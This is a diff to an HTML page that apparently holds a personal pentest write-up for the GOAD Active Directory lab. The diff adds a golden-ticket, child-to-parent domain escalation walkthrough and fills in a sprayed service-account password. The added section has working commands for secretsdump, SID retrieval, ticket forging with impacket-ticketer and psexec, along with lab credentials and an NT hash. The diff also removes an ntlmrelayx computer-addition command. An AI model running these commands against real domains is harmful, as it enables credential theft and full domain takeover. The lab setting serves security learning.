@@ -140,7 +140,7 @@
 
   <div>
         <div class="toc col-lg-3 hidden-xs hidden-sm">
-            <div id="toc"><ul><li><a class="toc-href" href="#status" title="Status">Status</a></li><li><a class="toc-href" href="#initial-enumeration" title="Initial Enumeration">Initial Enumeration</a></li><li><a class="toc-href" href="#smb-relay" title="SMB Relay">SMB Relay</a></li><li><a class="toc-href" href="#llmnr-poisoning" title="LLMNR Poisoning">LLMNR Poisoning</a></li><li><a class="toc-href" href="#dns-takeover-via-ipv6" title="DNS takeover via IPv6">DNS takeover via IPv6</a></li><li><a class="toc-href" href="#plaintext-password" title="Plaintext Password">Plaintext Password</a></li><li><a class="toc-href" href="#password-spraying" title="Password Spraying">Password Spraying</a></li><li><a class="toc-href" href="#credentials-dumping" title="Credentials Dumping">Credentials Dumping</a></li><li><a class="toc-href" href="#donpapi" title="DonPAPI">DonPAPI</a></li><li><a class="toc-href" href="#mimikatz" title="Mimikatz">Mimikatz</a></li><li><a class="toc-href" href="#gpo-abuse" title="GPO Abuse">GPO Abuse</a></li><li><a class="toc-href" href="#shares-enumeration" title="Shares Enumeration">Shares Enumeration</a></li><li><a class="toc-href" href="#kerberoasting" title="Kerberoasting">Kerberoasting</a></li><li><a class="toc-href" href="#as-rep-roasting" title="AS-REP Roasting">AS-REP Roasting</a></li><li><a class="toc-href" href="#unconstrained-delegation" title="Unconstrained Delegation">Unconstrained Delegation</a></li><li><a class="toc-href" href="#golden-ticket" title="Golden Ticket">Golden Ticket</a></li><li><a class="toc-href" href="#silver-ticket" title="Silver Ticket">Silver Ticket</a></li></ul></div>
+            <div id="toc"><ul><li><a class="toc-href" href="#status" title="Status">Status</a></li><li><a class="toc-href" href="#initial-enumeration" title="Initial Enumeration">Initial Enumeration</a></li><li><a class="toc-href" href="#smb-relay" title="SMB Relay">SMB Relay</a></li><li><a class="toc-href" href="#llmnr-poisoning" title="LLMNR Poisoning">LLMNR Poisoning</a></li><li><a class="toc-href" href="#dns-takeover-via-ipv6" title="DNS takeover via IPv6">DNS takeover via IPv6</a></li><li><a class="toc-href" href="#plaintext-password" title="Plaintext Password">Plaintext Password</a></li><li><a class="toc-href" href="#password-spraying" title="Password Spraying">Password Spraying</a></li><li><a class="toc-href" href="#credentials-dumping" title="Credentials Dumping">Credentials Dumping</a></li><li><a class="toc-href" href="#donpapi" title="DonPAPI">DonPAPI</a></li><li><a class="toc-href" href="#mimikatz" title="Mimikatz">Mimikatz</a></li><li><a class="toc-href" href="#gpo-abuse" title="GPO Abuse">GPO Abuse</a></li><li><a class="toc-href" href="#shares-enumeration" title="Shares Enumeration">Shares Enumeration</a></li><li><a class="toc-href" href="#kerberoasting" title="Kerberoasting">Kerberoasting</a></li><li><a class="toc-href" href="#as-rep-roasting" title="AS-REP Roasting">AS-REP Roasting</a></li><li><a class="toc-href" href="#unconstrained-delegation" title="Unconstrained Delegation">Unconstrained Delegation</a></li><li><a class="toc-href" href="#golden-ticket" title="Golden Ticket">Golden Ticket</a><ul><li><a class="toc-href" href="#child-domain-to-parent" title="Child domain to parent">Child domain to parent</a></li></ul></li><li><a class="toc-href" href="#silver-ticket_1" title="Silver Ticket">Silver Ticket</a></li></ul></div>
         </div>
     <h2 id="status">Status</h2>
 <p>Recovered Passwords:</p>
@@ -355,7 +355,6 @@
 <p>TODO:</p>
 <ul>
 <li>Unconstrained delegation on winterfell</li>
-<li>golden ticket</li>
 <li>mssql</li>
 </ul>
 <h2 id="initial-enumeration">Initial Enumeration</h2>
@@ -757,11 +756,6 @@
 </code></pre></div>
 <p><img alt="Pasted image 20250209171942.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250209171942.png"/></p>
 <p><strong>Cannot create backdoor user due to constraint failing!</strong></p>
-<p>Add computer with delegation capabilities to relayed computer (castelblack) for Resource-based Constrained delegation:</p>
-<div class="highlight"><pre><span></span><code>impacket-ntlmrelayx<span class="w"> </span>-6<span class="w"> </span>-wh<span class="w"> </span>attackerwpad.north.sevenkingdoms.local<span class="w"> </span>-t<span class="w"> </span>ldap://10.1.0.11<span class="w"> </span>-l<span class="w"> </span>dumps/loot<span class="w"> </span>--add-computer<span class="w"> </span>castelwhite<span class="w"> </span>--delegate-access
-</code></pre></div>
-<p>Adding new computer with username: castelwhite$ and password: 5D#0+MA.;QgRvh.</p>
-<p><img alt="Pasted image 20250209175315.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250209175315.png"/></p>
 <h2 id="plaintext-password">Plaintext Password</h2>
 <p>After enumerating users with <code>robb.stark</code>, a cleartext password for user <code>samwell.tarly</code> is found in the description property:</p>
 <p><img alt="north-users-enumetation.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-users-enumetation.png"/></p>
@@ -779,7 +773,7 @@
 <div class="highlight"><pre><span></span><code>proxychains<span class="w"> </span>donpapi<span class="w"> </span>collect<span class="w"> </span>--no-pass<span class="w"> </span>-u<span class="w"> </span>eddard.stark<span class="w"> </span>-d<span class="w"> </span>NORTH<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>.1.0.22
 </code></pre></div>
 <p><img alt="north-smb-relay-credential-dumping.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-smb-relay-credential-dumping.png"/></p>
-<p>By performing password spraying, the password <code>` belongs to</code>sql_svc`</p>
+<p>By performing password spraying, the password <code>YouWillNotKerboroast1ngMeeeeee</code> belongs to <code>sql_svc</code></p>
 <h2 id="mimikatz">Mimikatz</h2>
 <p>With <code>eddard.stark</code> (domain admin):</p>
 <div class="highlight"><pre><span></span><code>privilege::debug
@@ -892,8 +886,30 @@ lsadump::dcsync /user:arya.stark
 <h2 id="unconstrained-delegation">Unconstrained Delegation</h2>
 <p>TODO</p>
 <h2 id="golden-ticket">Golden Ticket</h2>
-<p>TODO</p>
-<h2 id="silver-ticket">Silver Ticket</h2>
+<h3 id="child-domain-to-parent">Child domain to parent</h3>
+<p>Dump NTLM hashes and Kerberos keys:</p>
+<div class="highlight"><pre><span></span><code>impacket-secretsdump<span class="w"> </span>robb.stark:sexywolfy@winterfell.north.sevenkingdoms.local
+</code></pre></div>
+<p><img alt="Pasted image 20250212194247.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250212194247.png"/></p>
+<p>Get child domain SID:</p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span>winterfell.north.sevenkingdoms.local<span class="w"> </span>-u<span class="w"> </span>NORTH<span class="se">\\</span>robb.stark<span class="w"> </span>-p<span class="w"> </span>sexywolfy<span class="w"> </span>--get-sid
+</code></pre></div>
+<p><img alt="Pasted image 20250212194446.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250212194446.png"/></p>
+<p>Get parent domain SID:</p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span>kingslanding.sevenkingdoms.local<span class="w"> </span>-u<span class="w"> </span>NORTH<span class="se">\\</span>robb.stark<span class="w"> </span>-p<span class="w"> </span>sexywolfy<span class="w"> </span>--get-sid
+</code></pre></div>
+<p><img alt="Pasted image 20250212194612.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250212194612.png"/></p>
+<p>Forge a Golden Ticket:</p>
+<div class="highlight"><pre><span></span><code>impacket-ticketer<span class="w"> </span>-domain<span class="w"> </span><span class="s1">'north.sevenkingdoms.local'</span><span class="w"> </span>-domain-sid<span class="w"> </span><span class="s1">'S-1-5-21-3880070986-3446816858-598620870'</span><span class="w"> </span>-extra-sid<span class="w"> </span><span class="s1">'S-1-5-21-1562319857-885082017-3582239089-519'</span><span class="w"> </span>-nthash<span class="w"> </span><span class="s1">'74997deb76cf0e9e1ea194f2092127e6'</span><span class="w"> </span><span class="s1">'Administrator'</span>
+</code></pre></div>
+<p><img alt="Pasted image 20250212194807.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250212194807.png"/></p>
+<p><strong>Note</strong>: in SID History (<code>-extra-sid</code>) has been set the parent domain (<code>sevenkingdoms.local</code>) Enterprise Administrators group's SID (<code>&lt;domain SID&gt;-519</code>).</p>
+<p>Use the forged Golden Ticket to pwn the parent domain abusing implicit trust:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+impacket-psexec<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>north.sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local
+</code></pre></div>
+<p><img alt="Pasted image 20250212195051.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250212195051.png"/></p>
+<h2 id="silver-ticket_1">Silver Ticket</h2>
 <p>TODO</p>
   </div>
   <div class="tag-cloud">
